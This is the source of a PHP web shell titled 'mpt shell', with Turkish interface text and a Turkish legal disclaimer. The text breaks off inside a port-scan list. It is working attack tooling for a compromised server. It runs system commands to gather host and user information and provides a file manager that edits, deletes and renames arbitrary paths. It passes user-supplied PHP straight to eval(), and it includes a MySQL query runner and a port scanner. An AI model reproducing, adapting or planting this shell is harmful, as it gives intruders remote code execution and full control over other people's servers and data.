<html>
<head>

<!--
Tarih : 05.07.2019
Language: Turkish
--------------------------------------------------
!!! Önemli Uyarı !!! 
Bu dosyanın, "siber güvenlik (güvenlik!) çerçevesi dışında suç teşkil edecek davranış ve/veya faaliyetlerde kullanılmasından" bu dosyayı  geliştiren kişi sorumlu değildir!. 
Bu dosya yanlızca siber güvenlik çerçevesinde kullanılması amacıyla geliştirilmiştir. Bir suç veya suç teşkil eden olaylarda, faaliyetlerde kullanılması için geliştirilmemiştir. Bu dosyayı kullanan şahıs, şahıslar, grup, gruplar veya topluluklar, bunu dikkate alarak kullanmalıdırlar. Ayrıca bu dosyanın orjinal halinin, dosyayı kullanan kişi/kişiler, gruplar veya topluluklar tarafından değiştirilerek, tahrif edilerek, bozularak veya kırpılarak, yasal uyarı kısmı olan bu metinlerin tahrif olmasından, silinmesinden geliştirici kişi sorumlu değildir.!
Bu dosya, kaynak kodları açık halde 05.07.2019 (5 Temmuz 2019) tarihinde Github.com üzerinden yayınlanmıştır.
Bu dosyanın kullanılması halinde kullananların, '!!! Önemli Uyarı  !!!'  başlığı altında geçen ve belirtilen tüm bu sorumlulukları kendi üzerine aldığı/aldıkları kabul edilir.
--------------------------------------------------
-->



<style>
body{
	background-color:#BEC3C7;
	font-size:auto;
}
.ust{
	width:100%;
	height:179px;
	background-color:#34495E;
	font-size:auto;
	
}
.ust-bilgi{
	#border:1px solid #ffffff;
	color:white;
	width:98%;
	height:144px;
	padding-top:2px;
	margin:5px;
	margin-left:0px;
	background-color:;
	font-family:arial;
	font-size:15px;
	font-size:auto;
}
.ust-butonlar{
	
	width:%100px;
	height:26px;
	border:1px solid #ffffff;
	
}
.ust-butonlar {list-style:none outside none;font-size:auto;}
.ust-butonlar li{font-family:arial;position:relative;display:inline;margin-left:10px;margin-right:1px}
.ust-butonlar li a{color:white;text-decoration:none;font-size:15px;} 
.ust-butonlar li a:hover{color:black;background-color:white}
.mysql-bagla{
	width:864px;
	margin-top:5px;
	padding-top:5px;
	height:677px;
	border:1px solid black;
	color:white;
}
.mysql-bagla b{
	width:50px;
	font-family:verdana;
	font-size:15px;
	height:auto;
	background-color:#34495E;
}
.bagla-buton{
	width:214px;
	height:25px;
	background-color:#34495E;
	margin-bottom:5px;
	border:2px solid black;
	margin-top:5px;
	color:white;
	
}
.sql-calistir{
	background-color:#34495E;
	margin-left:5px;
	border:2px solid black;
	color:white;
}
.endecoder-style{
	margin-top:5px;
	width:853px;
	height:624px;
	border:2px solid black;
	
}
.phpcode{
	width:853px;
	height:624px;
	border:2px solid black;
	padding-top:5px;
	margin-top:5px;
}
.porttara{
	width:853px;
	height:624px;
	border:2px solid black;
	padding-top:5px;
	margin-top:5px;
}
.symlink{
	width:853px;
	height:624px;
	border:2px solid black;
	margin-top:5px;
	padding-top:5px;
}
.tersbaglanti{
	width:853px;
	height:624px;
	border:2px solid black;
	margin-top:5px;
	padding-top:5px;
}
.ag{
	width:853px;
	height:624px;
	border:2px solid black;
	margin-top:5px;
	padding-top:5px;
}
.yukle{
	width:853px;
	height:624px;
	border:2px solid black;
	margin-top:5px;
	padding-top:5px;
}
.hangi_dosyalar{
	width:1153px;
	height:644px;
	border:2px solid black;
	margin-top:5px;
	padding-top:5px;
}
.hangi_dosyalar ::placeholder{
	color:white;
}
.anasayfa_listesi{
	margin-top:10px;
	width:100%;
	height:auto;
	min-height:700px;
	border:1px solid black;
	
}
.dosya_listesi_baslik{
	width:100%;
	
	height:27px;
	line-height:27px;
	color:white;
	background-color:#34495E;
}

.kelepce0{font-family:verdana;font-size:15px;display:inline-block;width:38%;text-overflow:ellipsis;height:25px;overflow:hidden;padding-left:5px;}
.kelepce1{font-family:verdana;font-size:15px;display:inline-block;width:15%;text-overflow:ellipsis;height:25px;overflow:hidden;}
.kelepce2{font-family:verdana;font-size:15px;display:inline-block;width:9%;text-overflow:ellipsis;height:25px;overflow:hidden;}
.kelepce3{font-family:verdana;font-size:15px;display:inline-block;width:34%;text-overflow:ellipsis;height:25px;overflow:hidden;}
.dosya_listesi_a{
width: 100%;
border: 0.1px solid white;
margin-top:0px;
height:25px;;
background-color:#5E5E5E;
color:white;
				
}
.dosya_listesi_a:hover{
background-color:white;
color:black
}
.dosya_listesi_a:hover a{
background-color:white;
color:#34495E
}
.dosya_listesi_a1{font-family:verdana;font-size:15px;display:inline-block;width:38%;text-overflow:ellipsis;height:25px;overflow:hidden;padding-left:5px;line-height:25px}
.dosya_listesi_a2{font-family:verdana;font-size:15px;display:inline-block;width:15%;text-overflow:ellipsis;height:25px;overflow:hidden;line-height:25px}
.dosya_listesi_a3{font-family:verdana;font-size:15px;display:inline-block;width:9%;text-overflow:ellipsis;height:25px;overflow:hidden;line-height:25px}
.dosya_listesi_a4{font-family:verdana;font-size:15px;display:inline-block;width:34%;text-overflow:ellipsis;height:25px;overflow:hidden;line-height:25px}
.dosya_listesi_a a{
color:white;
}
.dosya_listesi_a a:hover{
color:#34495E;
}
.turkungucu{
background-color:black;
color:#ccb95c
}
.anasayfa_altlari{
width:100%;
height:600px;
border:2px solid black;
padding-top:10px;
background-color:#b1b1b1;
}
.komut_seyi{
width:963px;
 position: relative;
margin: auto;
height:31px;
background-color:#5E5E5E
		
}
.komut_bu::placeholder{
color:black;
}
.cagir{
width:963px;
position: relative;
margin: auto;
height:31px;
line-height:31px;
background-color:#5E5E5E
}
.cagirilan_bu::placeholder{
		color:black;
}
.hakkinda{
	width:900px;
	height:450px;
	border:3px solid wheat;
	margin-top:20px;
	margin-bottom:20px;
	font-weight:bold;
	font-size:17px;
	font-family:verdana;
}
</style>
<title>mpt shell</title>
<script
  src="https://code.jquery.com/jquery-3.4.1.js"
  integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU="
  crossorigin="anonymous"></script>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
</head>
<?php
function sisteminiz() {
 $tespit=$_SERVER['HTTP_USER_AGENT'];
 if(stristr($tespit,"Windows 95")) { $os="Windows 95"; }
 elseif(stristr($tespit,"Windows 98")) { $os="Windows 98"; }
 elseif(stristr($tespit,"Windows NT 5.0")) { $os="Windows 2000"; }
 elseif(stristr($tespit,"Windows NT 5.1")) { $os="Windows XP"; }
 elseif(stristr($tespit,"Windows NT 6.0")) { $os="Windows Vista"; }
 elseif(stristr($tespit,"Windows NT 6.1")) { $os="Windows 7"; }
 elseif(stristr($tespit,"Windows NT 6.2")) { $os="Windows 8"; }
 elseif(stristr($tespit,"Windows NT 10.0")) { $os="Windows 10"; }
 elseif(stristr($tespit,"Mac")) { $os="Mac"; }
 elseif(stristr($tespit,"Linux")) { $os="Linux"; }
 else {$os="Belli Değil.";}
 return $os;
 }

function tarayiciniz() {
 $tespit2=$_SERVER['HTTP_USER_AGENT'];
 if(stristr($tespit2,"MSIE")) { $tarayici="Internet Explorer"; }
 elseif(stristr($tespit2,"Firefox")) { $tarayici="Mozilla Firefox"; }
 elseif(stristr($tespit2,"YaBrowser")) { $tarayici="Yandex Browser"; }
 elseif(stristr($tespit2,"Chrome")) { $tarayici="Google Chrome"; }
 elseif(stristr($tespit2,"Safari")) { $tarayici="Safari"; }
 elseif(stristr($tespit2,"Opera")) { $tarayici="Opera"; }
 else {$tarayici="Belli Değil.";}
 return $tarayici;
 }
?>
<body>
		<div class="ust">
			<div class="ust-bilgi" style="">
				<b><u>System Bilgisi </u></b>:<?php system('uname -a');?> <?php  system('systeminfo | find /i "OS Name:"');?><?php  system('systeminfo | find /i "OS Version:"');?>
				<br>
				<?php echo "<b><u>Sizin İşletim Sisteminiz: </u></b>".sisteminiz(); ?><b><br></b><?php echo "<b><u>Sizin Tarayıcınız: </u></b>".tarayiciniz();?>
				<br>
				<?php echo "<b><u>Disk Bilgisi</u></b>: "; ?><?php system("wmic logicaldisk where caption='%systemdrive%' get /value | find /i \"Size=\""); echo "byte&nbsp;&nbsp;";
				system("wmic logicaldisk where caption='%systemdrive%' get /value | find /i \"DeviceID=\"")."<br>";
				?>
				<br>
				<b><u>Kullanıcı/Yetki: </u></b><?php system('whoami');?>
				<br>
				<b><u>Sizin İp: </u></b><?php echo getenv('REMOTE_ADDR');?>&nbsp;&nbsp;
				<b><u>Sunucu İp: </u></b><?php echo getenv('SERVER_ADDR');?>&nbsp;&nbsp;
				<b><u>Sunucu Yazılımı: </u></b>&nbsp;<?php echo $_SERVER['SERVER_SOFTWARE'];?> </b><br>
				<?php echo "<b><u>Kapalı Fonksiyonlar(Disable Functions) : </u></b>";
				$shellcik='ini_get  !';
				//ini_get var mı, ini_get den kapalı fonksiyonları al.
				 if((@function_exists('ini_get')) &&(''==($shellcik=@ini_get('disable_functions'))))
				 {
				echo "Yok";
				}else{
					echo "$shellcik";
				}
				?>
				<br>
				<b><u>Dizin-pwd: </u></b><?php system("pwd"); system("dir | findstr /i \"Directory Of:\"");?> 
			</div>
			<div class="ust-butonlar">
					<li><a href="?anasayfa&dizin_goster=<?php echo getcwd();?>"><b>[ Anasayfa ]</b></a></li>
					<li><a href="?endecoder">[ Encoder/Decoder ]</a></li>
					<li><a href="?mysqlconnect">[ MySQL Bağlantı Testi ]</a></li>
					<li><a href="?phpcode">[ PHP Kodu Çalıştırma ]</a></li>
					<li><a href="?symlink">[ Symlink ]</a></li>					
					<li><a href="?port_tarama">[ Port Tarama ]</a></li>
					<li><a href="?dosyalar">[ Dosyalar ]</a></li>
					<li><a href="?ag">[ Ağ ]</a></li>
					<li><a href="?phpinfo">[ PHP İnfo ]</a></li>	
					<li><a href="?upload">[ Upload ]</a></li>
					<li><a href="?info"><b>#[ Hakkında ]#</b></a></li>
					
			</div>
				
		
		</div>
		<?php if(empty($_GET) || isset($_GET['anasayfa'])){?>
		
		<div class="anasayfa_listesi">
							<div class="dosya_listesi_baslik" >
								<b>
								<div class="kelepce0">Dosya Yöneticisi</div>
								<div class="kelepce1">Tür - Boyutu</div>
								<div class="kelepce2">İzinler</div>
								<div class="kelepce3">İşlemler</div>
								</b>
							</div>
				<?php 
							error_reporting(0);
							$hangisi=$_GET['dizin_goster'];
							
							$files1 = scandir($hangisi,1);
							
							$sayisi = count($files1);
							for($i=0;$i<$sayisi;$i++){
				?>
			<div class="dosya_listesi_a">					
				<div class="dosya_listesi_a1">[<a href="?anasayfa&dizin_goster=<?php echo $hangisi.'\\'.$files1[$i];?>"><b> <?php echo $files1[$i]; ?> </b> </a>]</div>
				<div class="dosya_listesi_a2">[ <font color='wheat'><?php echo mime_content_type($files1[$i])." - ". filesize($files1[$i])." Bytes</font>";?>]</div>
				<div class="dosya_listesi_a3">[ <?php $perms=fileperms($files1[$i]);switch($perms&0xF000){case 0xC000:$info='s';break;case 0xA000:$info='l';break;case 0x8000:$info='r';break;case 0x6000:$info='b';break;case 0x4000:$info='d';break;case 0x2000:$info='c';break;case 0x1000:$info='p';break;default:$info='u';}$info.=(($perms&0x0100)?'r':'-');$info.=(($perms&0x0080)?'w':'-');$info.=(($perms&0x0040)?(($perms&0x0800)?'s':'x'):(($perms&0x0800)?'S':'-'));$info.=(($perms&0x0020)?'r':'-');$info.=(($perms&0x0010)?'w':'-');$info.=(($perms&0x0008)?(($perms&0x0400)?'s':'x'):(($perms&0x0400)?'S':'-'));$info.=(($perms&0x0004)?'r':'-');$info.=(($perms&0x0002)?'w':'-');$info.=(($perms&0x0001)?(($perms&0x0200)?'t':'x'):(($perms&0x0200)?'T':'-'));echo $info; ?> ]</div>
				<div class="dosya_listesi_a4">[ <a href="?anasayfa&duzenle=<?php echo getcwd()."\\".$files1[$i];?>" style="text-decoration: none;">Düzenle</a> | <a href="?anasayfa&sil=<?php echo getcwd()."\\".$files1[$i];?>" style="text-decoration: none;">Sil</a> | <a href="?anasayfa&rename=<?php echo getcwd()."\\".$files1[$i];?>"style="text-decoration: none;">Yeniden Adlandır</a> ]</div>				
			</div>			
			
			<?php 
			}
			?>
			
		<div class="dosya_listesi_a"><a href="?anasayfa&dizin_goster=<?php $kel = $_GET['dizin_goster']; echo $kel."\\..\\";?>" style="padding-left:5px;font-family:verdana;font-size:15px;line-height:25px;"><b>[ .. ] - [ Üst Dizin ]</b></a></div>
		<?php 
			if(is_file($_GET['duzenle'])){
					
				$duzenlenecek = $_GET['duzenle'];
				$dt = fopen($duzenlenecek, "r");
				$icerik = fread($dt, filesize($duzenlenecek));
			
				
			?>
			<center>
			<form action="" method="post">
			<font color="#D25400" style="font-size:15px;font-family:verdana;"><b>Düzenle:</b>&nbsp;</font><font style="color:wheat;font-size:15px;font-family:verdana"><b><?php echo htmlspecialchars($duzenlenecek);?></b></font><br><br>
			<textarea style="" rows="30" cols="153" class="turkungucu" name="kaydedilen_bilgi"><?php echo htmlspecialchars($icerik);?></textarea>
			<br>
			<input type="submit" value="[ Kaydet ]" name="kaydedildi" style="background-color:34495E;color:white">
			</form>
			</center>
			<?php			
			}
			?>
			<?php
			if(isset($_POST['kaydedildi'])){
				$dosyaici = $_POST['kaydedilen_bilgi'];
				$dt = fopen($duzenlenecek, "w+");
				$yazsana = fwrite($dt,$dosyaici);
					if($yazsana){
						echo "<script>alert('Kaydedildi');</script>";
						fclose($hangidosya);
					}else{
						echo "<script>alert('Kaydetme Başarısız');</script>";
					}
			}
			?>
			<center>
			<?php
			
			
				if(is_file($_GET['sil'])){
					$silinecek = $_GET['sil'];
					$unl = unlink($silinecek);
					if($unl){
						echo "<script>alert('Silindi');</script>";
					}
				}
			
			
				function delete_directory($dirname) {
					 if (is_dir($dirname))
					   $dir_handle = opendir($dirname);
				 if (!$dir_handle)
					  return false;
				 while($file = readdir($dir_handle)) {
					   if ($file != "." && $file != "..") {
							if (!is_dir($dirname."/".$file))
								 unlink($dirname."/".$file);
							else
								 delete_directory($dirname.'/'.$file);
					   }
				 }
				 closedir($dir_handle);
				 rmdir($dirname);
				 return true;
			}
			if(is_dir($_GET['sil'])){
			$sil_dizin = $_GET['sil'];
			$silindimi = delete_directory($sil_dizin);
			
			if($silindimi){
				echo "<script>alert('Silindi');</script>";
			}else{
						echo "<script>alert('Silinemedi');</script>";
					}
			}
			
					
			?>
			</center>
			<?php
			if(isset($_GET['rename'])){
				$yeniden_dizin = $_GET['rename'];
				?>
				<center>
				<form action="" method="post">
				<div class="ad_degistir" style="margin-top:25px;border:2px solid black;width:800px;height:450px;color:#D25400;font-family:verdana;font-size:15px">
				Dizin veya Dosya adını Değiştir: <br>Eski:&nbsp;<input type="textbox" name="eski_adi" value="<?php echo $yeniden_dizin;?>" placeholder="Dosya veya Dizin Yolu : /home/X/public_htm/dosya.php" style="width:445px"><br><br>
				Yeni:&nbsp;<input type="textbox" name="yeni_adi" placeholder="Dosya veya Dizin Yolu : /home/X/public_htm/dosya.php" style="width:445px"><br>
				<input type="submit" value="Değiştir" name="adi_degistir" style="background-color:34495E;color:white;margin-top:12px;">
				</div>
				</form>
				</center>
				<?php
				if(isset($_POST['adi_degistir'])){
					if(empty($_POST['eski_adi'] && $_POST['yeni_adi'])){
						echo "<script>alert('Bilgiler Boş Olamaz');</script>";
						}else{
							$eski_ad = $_POST['eski_adi'];
							$yeni_ad = $_POST['yeni_adi'];
							$oldu_reis = rename($eski_ad,$yeni_ad);
							if($oldu_reis){
								echo "<script>alert('Değiştirildi.');</script>";
							}
						}
				}
			}
			?>
		</div>
		<?php } else{?>
			<?php 
					error_reporting(0);
					if(isset($_GET['mysqlconnect'])){			
					?>
				<center>
				<div class="mysql-bagla">
						<form method="post" action="?mysqlconnect">
							<font color="#D25400" style="font-size:15px;font-family:verdana;">Sunucu:</font>&nbsp;<input type="textbox" name="sunucu" placeholder="MySql Sunucusu"><br>
							<font color="#D25400" style="font-size:15px;font-family:verdana;">Port:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><input type="textbox" name="port" placeholder="MySQL Portu:(3306)"><br>
							<font color="#D25400" style="font-size:15px;font-family:verdana;">K-Adı:&nbsp;&nbsp;&nbsp;&nbsp;</font><input type="textbox" name="db-kadi" placeholder="Örnek:root"><br>
							<font color="#D25400" style="font-size:15px;font-family:verdana;">Parola:&nbsp;&nbsp;&nbsp;</font><input type="textbox" name="db-parolasi" placeholder="Örnek:#11-23c$.w2"><br>
							<font color="#D25400" style="font-size:15px;font-family:verdana;">DB-Adı:&nbsp;&nbsp;</font><input type="textbox" name="v_adi" placeholder="Veritabanı İsmi"><br><br>
							<font color="#D25400" style="font-size:15px;font-family:verdana;">SQL Sorgusu:&nbsp;&nbsp;<br><br></font><input type="textbox" maxlength="1024" style="width:500px" name="sql-sorgusu" placeholder="SELECT @@version, SHOW VARIABLES"><br>
							<input type="submit" name="submit" class="bagla-buton" value="Test Et ve Sorguyu Çalıştır"><br>
						
						<?php
						if(isset($_POST['submit'])){
							$db_adresi = $_POST['sunucu'];
							$db_kadi = $_POST['db-kadi'];
							$db_parola = $_POST['db-parolasi'];
							$db_port = $_POST['port'];
							$db_adi = $_POST['v_adi'];
							$db_sorgu = $_POST['sql-sorgusu'];							
							
							$db_bagla = mysqli_connect($db_adresi,$db_kadi,$db_parola,$db_adi);						
							if($db_bagla){								
								$sorgu = mysqli_query($db_bagla,$db_sorgu);
								echo "<b class='cevap'>Bağlantı Var</b><br><br>";
								$sor = mysqli_query($db_bagla,$db_sorgu);															
								?>							
							<textarea name="sorgu-cevabı" placeholder="" rows="12" cols="101" ><?php while($cevap = mysqli_fetch_row($sor)){ echo $cevap[0]."=".$cevap[1].chr(13).$cevap[2].chr(13).$cevap[3].chr(13).$cevap[4];}?></textarea>								
								<?php 
									}								
							}else{
								echo "<b class='cevap'>Bağlantı Yok veya Bilgiler Yanlış</b>";
							}
						}
					
						?>
						</form>
					</center>					
					<?php
					error_reporting(0);
					if(isset($_GET['phpinfo'])){
						$phpinfo = "shell-phpinfo.php";
						$olustur = fopen($phpinfo, 'w') or die("Bi' sıkıntı oldu");
						$veri = "<?php phpinfo();?>";
						fwrite($olustur,$veri);	
						echo "<script>alert('phpinfo dosyası shell-phpinfo.php olarak oluşturuldu');</script>";
					}
					?>
					<?php 
						if(isset($_GET['endecoder'])){
							?>
							<center>
							<div class="endecoder-style"><br>
							<form action="" method="post">
							<b style="color:#D25400;font-family:verdana;font-size:15px">md5 encrypt:</b> <input type="textbox" placeholder="metin" name="md5-encrpyt" style="width:340px"><input type="submit" value="Encrpyt" name="encrpyt" style="background-color:34495E;color:white">
							</form>
								<?php 
								if(isset($_POST['encrpyt'])){
									$md5_metin = md5($_POST['md5-encrpyt']);
									echo "<b style='width:50px;font-family:verdana;font-size:15px;height:auto;background-color:#34495E;color:white;padding-left:5px;padding-right:5px;'><font color=#E77E23>encrpyted: </font>{$md5_metin}</b>";
								}
								?>
							<form action="" method="post">
							<b style="color:#D25400;font-family:verdana;font-size:15px">sha1 encrypt:</b> <input type="textbox" placeholder="metin" name="sha1-encrpyt" style="width:340px"><input type="submit" value="Encrpyt" name="sha1-encrpytb" style="background-color:34495E;color:white">
							</form>
								<?php 
								if(isset($_POST['sha1-encrpytb'])){
									$sha1_metin = md5($_POST['sha1-encrpyt']);
									echo "<b style='width:50px;font-family:verdana;font-size:15px;height:auto;background-color:#34495E;color:white;padding-left:5px;padding-right:5px;'><font color=#E77E23>encrpyted: </font>{$sha1_metin}</b>";
								}
								?>
								
								
							<form action="" method="post">
							<br>
							<b style="color:#D25400;font-family:verdana;font-size:15px">base64 encode:</b> <input type="textbox" placeholder="metin" name="base64-encode" style="width:640px"><input type="submit" value="Encode" name="encoding" style="background-color:34495E;color:white"><br>
							<?php 
								if(isset($_POST['encoding'])){
									$base64_metin = base64_encode($_POST['base64-encode']);
									echo "<br><b style='width:50px;font-family:verdana;font-size:15px;height:auto;background-color:#34495E;color:white;padding-left:5px;padding-right:5px;'><font color=#E77E23>encoded: </font></b><br><br><textarea style='margin: 0px; height: 119px; width: 805px;'>{$base64_metin}</textarea>";
								}
								?>
							
							</form>
							
							<form action="" method="post">
							<br>
							<b style="color:#D25400;font-family:verdana;font-size:15px">base64 decode:</b> <input type="textbox" placeholder="metin" name="base64-decode" style="width:640px"><input type="submit" value="Encode" name="decoding" style="background-color:34495E;color:white"><br>
							<?php 
								if(isset($_POST['decoding'])){
									$base64_demetin = base64_decode($_POST['base64-decode']);
									echo "<br><b style='width:50px;font-family:verdana;font-size:15px;height:auto;background-color:#34495E;color:white;padding-left:5px;padding-right:5px;'><font color=#E77E23>decoded: </font></b><br><br><textarea style='margin: 0px; height: 119px; width: 805px;'>{$base64_demetin}</textarea>";
								}
								?>
							
							</form>
							</div>
							</center>
						<?php	
						}
					?>
					<?php 
					if(isset($_GET['phpcode'])){						
						?>
						<center>
						<div class="phpcode">
						<form action="" method="post">
							<textarea name="phpkodu" placeholder="#phpkodları&#10;echo system('dir');"  style="margin: 0px; height: 419px; width: 805px;"></textarea>
							<br>
							<input type="submit" value="Kodu Çalıştır" name="php-calistir" style="background-color:#34495E;color:white"><br>
							<?php
							if(isset($_POST['php-calistir'])){
								$php_kodlari=$_POST['phpkodu'];
								?>
								<br>
								<textarea style='margin: 0px; height: 119px; width: 805px;'><?php eval($php_kodlari);?></textarea>
								<?php
							}							
							?>
						</form>
						</div>
						</center>
						<?php
					}
					?>
					<?php 
					if(isset($_GET['port_tarama'])){
						?>
						<center>
							<div class="porttara">
								<form action="" method="post"><br>
										<b style="font-family:verdana;font-size:15px;color:rgb(210, 84, 0);">Ip / Host:&nbsp;</b> <input type="textbox" name="iphost" placeholder="Ip-Host Adresi" style="width:299px"><br>
										<br>
										<b style="font-family:verdana;font-size:15px;background-color:34495E;color:white">Otomatik olarak, en çok kullanılan 1000 portu tarar.<br> Sistemin internet hızına göre sonuçların elde edilmesi gecikebilir ve esneyebilir.</b><br><br>
										<input type="submit" value="Portları Tara" name="portlaritara" style="background-color:#34495E;color:white;"><br>
								</form>
								<?php
								if(isset($_POST['portlaritara'])){
									
									$port_host = $_POST['iphost'];
									ini_set('max_execution_time', 0);
									ini_set('memory_limit', -1);
					$host_ismi = $port_host;
					$ports = array(1 ,3 ,4 ,6 ,7 ,9 ,13 ,17 ,19 ,20 ,21 ,22 ,23 ,24 ,25 ,26 ,30 ,32 ,33 ,37 ,42 ,43 ,49 ,53 ,70 ,79 ,80 ,81 ,82 ,83 ,84 ,85 ,88 ,89 ,90 ,99 ,100 ,106 ,109 ,110 ,111 ,113 ,119 ,125 ,135 ,139 ,143 ,144 ,146 ,161 ,163 ,179 ,199 ,211 ,212 ,222 ,254 ,255 ,256 ,259 ,264 ,280 ,301 ,306 ,311 ,340 ,366 ,389 ,406 ,407 ,416 ,417 ,425 ,427 ,443 ,444 ,445 ,458 ,464 ,465 ,481 ,497 ,500 ,512 ,513 ,514 ,515 ,524 ,541 ,543 ,544 ,545 ,548 ,554 ,555 ,563 ,587 ,593 ,616 ,617 ,625 ,631 ,636 ,646 ,648 ,666 ,667 ,668 ,683 ,687 ,691 ,700 ,705 ,711 ,714 ,720 ,722 ,726 ,749 ,765 ,777 ,783 ,787 ,800 ,801 ,808 ,843 ,873 ,880 ,888 ,898 ,900 ,901 ,902 ,903 ,911 ,912 ,981 ,987 ,990 ,992 ,993 ,995 ,999 ,1000 ,1001 ,1002 ,1007 ,1009 ,1010 ,1011 ,1021 ,1022 ,1023 ,1024 ,1025 ,1026 ,1027 ,1028 ,1029 ,1030 ,1031 ,1032 ,1033 ,1034 ,1035 ,1036 ,1037 ,1038 ,1039 ,1040 ,1041 ,1042 ,1043 ,1044 ,1045 ,1046 ,1047 ,1048 ,1049 ,1050 ,1051 ,1052 ,1053 ,1054 ,1055 ,1056 ,1057 ,1058 ,1059 ,1060 ,1061 ,1062 ,1063 ,1064 ,1065 ,1066 ,1067 ,1068 ,1069 ,1070 ,1071 ,1072 ,1073 ,1074 ,1075 ,1076 ,1077 ,1078 ,1079 ,1080 ,1081 ,1082 ,1083 ,1084 ,1085 ,1086 ,1087 ,1088 ,1089 ,1090 ,1091 ,1092 ,1093 ,1094 ,1095 ,1096 ,1097 ,1098 ,1099 ,1100 ,1102 ,1104 ,1105 ,1106 ,1107 ,1108 ,1110 ,1111 ,1112 ,1113 ,1114 ,1117 ,1119 ,1121 ,1122 ,1123 ,1124 ,1126 ,1130 ,1131 ,1132 ,1137 ,1138 ,1141 ,1145 ,1147 ,1148 ,1149 ,1151 ,1152 ,1154 ,1163 ,1164 ,1165 ,1166 ,1169 ,1174 ,1175 ,1183 ,1185 ,1186 ,1187 ,1192 ,1198 ,1199 ,1201 ,1213 ,1216 ,1217 ,1218 ,1233 ,1234 ,1236 ,1244 ,1247 ,1248 ,1259 ,1271 ,1272 ,1277 ,1287 ,1296 ,1300 ,1301 ,1309 ,1310 ,1311 ,1322 ,1328 ,1334 ,1352 ,1417 ,1433 ,1434 ,1443 ,1455 ,1461 ,1494 ,1500 ,1501 ,1503 ,1521 ,1524 ,1533 ,1556 ,1580 ,1583 ,1594 ,1600 ,1641 ,1658 ,1666 ,1687 ,1688 ,1700 ,1717 ,1718 ,1719 ,1720 ,1721 ,1723 ,1755 ,1761 ,1782 ,1783 ,1801 ,1805 ,1812 ,1839 ,1840 ,1862 ,1863 ,1864 ,1875 ,1900 ,1914 ,1935 ,1947 ,1971 ,1972 ,1974 ,1984 ,1998 ,1999 ,2000 ,2001 ,2002 ,2003 ,2004 ,2005 ,2006 ,2007 ,2008 ,2009 ,2010 ,2013 ,2020 ,2021 ,2022 ,2030 ,2033 ,2034 ,2035 ,2038 ,2040 ,2041 ,2042 ,2043 ,2045 ,2046 ,2047 ,2048 ,2049 ,2065 ,2068 ,2099 ,2100 ,2103 ,2105 ,2106 ,2107 ,2111 ,2119 ,2121 ,2126 ,2135 ,2144 ,2160 ,2161 ,2170 ,2179 ,2190 ,2191 ,2196 ,2200 ,2222 ,2251 ,2260 ,2288 ,2301 ,2323 ,2366 ,2381 ,2382 ,2383 ,2393 ,2394 ,2399 ,2401 ,2492 ,2500 ,2522 ,2525 ,2557 ,2601 ,2602 ,2604 ,2605 ,2607 ,2608 ,2638 ,2701 ,2702 ,2710 ,2717 ,2718 ,2725 ,2800 ,2809 ,2811 ,2869 ,2875 ,2909 ,2910 ,2920 ,2967 ,2968 ,2998 ,3000 ,3001 ,3003 ,3005 ,3006 ,3007 ,3011 ,3013 ,3017 ,3030 ,3031 ,3052 ,3071 ,3077 ,3128 ,3168 ,3211 ,3221 ,3260 ,3261 ,3268 ,3269 ,3283 ,3300 ,3301 ,3306 ,3322 ,3323 ,3324 ,3325 ,3333 ,3351 ,3367 ,3369 ,3370 ,3371 ,3372 ,3389 ,3390 ,3404 ,3476 ,3493 ,3517 ,3527 ,3546 ,3551 ,3580 ,3659 ,3689 ,3690 ,3703 ,3737 ,3766 ,3784 ,3800 ,3801 ,3809 ,3814 ,3826 ,3827 ,3828 ,3851 ,3869 ,3871 ,3878 ,3880 ,3889 ,3905 ,3914 ,3918 ,3920 ,3945 ,3971 ,3986 ,3995 ,3998 ,4000 ,4001 ,4002 ,4003 ,4004 ,4005 ,4006 ,4045 ,4111 ,4125 ,4126 ,4129 ,4224 ,4242 ,4279 ,4321 ,4343 ,4443 ,4444 ,4445 ,4446 ,4449 ,4550 ,4567 ,4662 ,4848 ,4899 ,4900 ,4998 ,5000 ,5001 ,5002 ,5003 ,5004 ,5009 ,5030 ,5033 ,5050 ,5051 ,5054 ,5060 ,5061 ,5080 ,5087 ,5100 ,5101 ,5102 ,5120 ,5190 ,5200 ,5214 ,5221 ,5222 ,5225 ,5226 ,5269 ,5280 ,5298 ,5357 ,5405 ,5414 ,5431 ,5432 ,5440 ,5500 ,5510 ,5544 ,5550 ,5555 ,5560 ,5566 ,5631 ,5633 ,5666 ,5678 ,5679 ,5718 ,5730 ,5800 ,5801 ,5802 ,5810 ,5811 ,5815 ,5822 ,5825 ,5850 ,5859 ,5862 ,5877 ,5900 ,5901 ,5902 ,5903 ,5904 ,5906 ,5907 ,5910 ,5911 ,5915 ,5922 ,5925 ,5950 ,5952 ,5959 ,5960 ,5961 ,5962 ,5963 ,5987 ,5988 ,5989 ,5998 ,5999 ,6000 ,6001 ,6002 ,6003 ,6004 ,6005 ,6006 ,6007 ,6009 ,6025 ,6059 ,6100 ,6101 ,6106 ,6112 ,6123 ,6129 ,6156 ,6346 ,6389 ,6502 ,6510 ,6543 ,6547 ,6565 ,6566 ,6567 ,6580 ,6646 ,6666 ,6667 ,6668 ,6669 ,6689 ,6692 ,6699 ,6779 ,6788 ,6789 ,6792 ,6839 ,6881 ,6901 ,6969 ,7000 ,7001 ,7002 ,7004 ,7007 ,7019 ,7025 ,7070 ,7100 ,7103 ,7106 ,7200 ,7201 ,7402 ,7435 ,7443 ,7496 ,7512 ,7625 ,7627 ,7676 ,7741 ,7777 ,7778 ,7800 ,7911 ,7920 ,7921 ,7937 ,7938 ,7999 ,8000 ,8001 ,8002 ,8007 ,8008 ,8009 ,8010 ,8011 ,8021 ,8022 ,8031 ,8042 ,8045 ,8080 ,8081 ,8082 ,8083 ,8084 ,8085 ,8086 ,8087 ,8088 ,8089 ,8090 ,8093 ,8099 ,8100 ,8180 ,8181 ,8192 ,8193 ,8194 ,8200 ,8222 ,8254 ,8290 ,8291 ,8292 ,8300 ,8333 ,8383 ,8400 ,8402 ,8443 ,8500 ,8600 ,8649 ,8651 ,8652 ,8654 ,8701 ,8800 ,8873 ,8888 ,8899 ,8994 ,9000 ,9001 ,9002 ,9003 ,9009 ,9010 ,9011 ,9040 ,9050 ,9071 ,9080 ,9081 ,9090 ,9091 ,9099 ,9100 ,9101 ,9102 ,9103 ,9110 ,9111 ,9200 ,9207 ,9220 ,9290 ,9415 ,9418 ,9485 ,9500 ,9502 ,9503 ,9535 ,9575 ,9593 ,9594 ,9595 ,9618 ,9666 ,9876 